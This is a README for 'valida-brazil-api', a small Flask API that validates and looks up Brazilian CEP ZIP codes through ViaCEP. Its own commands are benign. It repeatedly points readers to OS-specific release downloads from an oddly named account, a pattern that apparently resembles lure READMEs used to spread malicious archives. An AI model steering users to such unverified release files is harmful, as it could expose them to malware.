# 🌟 valida-brazil-api - Simple API for Brazilian ZIP Code Validation

## 🚀 Getting Started

Welcome to the valida-brazil-api project! This lightweight Flask API helps you validate and query Brazilian ZIP codes (CEP) using the ViaCEP service. Follow these simple steps to get started.

## 📥 Download

[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Thalloid-postmaturity853/valida-brazil-api/releases)

## 🔧 Requirements

Before you download the application, make sure your system meets these requirements:

- Operating System: Windows, MacOS, or Linux
- Python: Version 3.6 or later
- Internet Connection: Required for accessing the ViaCEP service

## 📦 Download & Install

To get your copy of the valida-brazil-api, follow these steps:

1. **Visit the Releases Page**  
   Click on the link below to go to the releases page:  
   [Release Page](https://github.com/Thalloid-postmaturity853/valida-brazil-api/releases)

2. **Choose the Latest Version**  
   On the releases page, find the latest version available. 

3. **Select Your Package**  
   Depending on your OS, choose the appropriate package (e.g., .zip for Windows, .tar.gz for Linux).

4. **Download the File**
   Click on the package file to start downloading.

5. **Extract the Files**  
   After downloading, extract the files using your preferred extraction tool.

6. **Open a Terminal or Command Prompt**  
   Navigate to the folder where you extracted the files.

7. **Install Dependencies**  
   Run the following command to install necessary libraries:  
   ```
   pip install -r requirements.txt
   ```

8. **Run the API**  
   Start the API by running this command:  
   ```
   python app.py
   ```

9. **Access the API**  
   Open your web browser and go to:  
   ```
   http://127.0.0.1:5000
   ```

## ⚙️ Usage

You can now use the API to validate ZIP codes. Here’s how:

1. **Validate a ZIP Code**  
   To validate a Brazilian ZIP code, send a GET request to:
   ```
   http://127.0.0.1:5000/validate/<cep>
   ```
   Replace `<cep>` with the actual ZIP code you wish to validate.

2. **Query Information**  
   Similarly, you can query detailed information about a ZIP code using:
   ```
   http://127.0.0.1:5000/query/<cep>
   ```

## 📓 API Endpoints

The valida-brazil-api offers the following endpoints:

- **`/validate/<cep>`**: Validates if the ZIP code exists.
- **`/query/<cep>`**: Provides detailed information for the ZIP code.

## 💡 Example Request

Here’s how you can validate the ZIP code 01001-000:

- URL:  
  ```
  http://127.0.0.1:5000/validate/01001-000
  ```

You will receive a JSON response indicating whether the ZIP code is valid or not.

## 📌 Important Notes

- Ensure your Python installation is properly set up.
- The API requires a functioning internet connection for validating and querying against the ViaCEP service.
- Your local firewall settings should allow traffic on port 5000 for the API to respond correctly.

## 🛠️ Troubleshooting

If you encounter any issues:

- **Common Errors:** 
  - Ensure that Python is installed and added to your system’s PATH.
  - Check for any typos in the ZIP code format (it should follow the Brazilian standard).

- **Logs:**  
  Check your terminal for any error messages when running the API.

## 💻 Contribution

Feel free to contribute to this project. If you have ideas or find bugs, open an issue on GitHub. Pull requests are welcome.

## 📬 Contact

For queries, you can reach out through the project repository or create an issue. 

Remember to place star ratings for this project on GitHub if you find it useful. Your support helps in improving the project. 

Enjoy validating and querying Brazilian ZIP codes with the valida-brazil-api!